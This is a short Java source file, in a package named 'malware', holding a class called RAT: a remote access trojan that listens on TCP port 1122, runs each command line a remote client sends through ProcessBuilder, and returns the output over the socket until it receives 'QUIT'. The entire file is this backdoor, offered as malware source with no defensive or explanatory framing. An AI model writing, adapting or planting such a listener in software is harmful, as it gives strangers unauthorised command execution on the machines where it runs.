package org.javase.malware;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.List;

public class RAT {
    private static String doIt(String command) throws Exception {
        ProcessBuilder builder = new ProcessBuilder(command);
        Process process = builder.start();

        StringBuilder sb = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            List<String> result = reader.lines().toList();
            result.forEach((l) -> {
                sb.append(l)
                        .append("\n");
            });
        }

        process.waitFor();
        return sb.toString();
    }

    public static void main(String[] args) {
        try (ServerSocket server = new ServerSocket(1122)) {
            System.out.println("Server is running on port 1122: ");

            while (true) {
                Socket socket = server.accept();
                InputStream inputStream = socket.getInputStream();
                OutputStream outputStream = socket.getOutputStream();
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                     PrintWriter writer = new PrintWriter(outputStream)) {
                    String command = reader.readLine();
                    System.out.println(command + " is sent from remote access!");

                    if (command.equals("QUIT")) {
                        break;
                    }

                    String result = doIt(command);
                    System.out.println(result);
                    writer.write(result);

                } catch (Exception ex) {
                    System.err.println(ex.getMessage());
                }
            }
        } catch (Exception ex) {
            System.err.println(ex.getMessage());
        }
    }
}
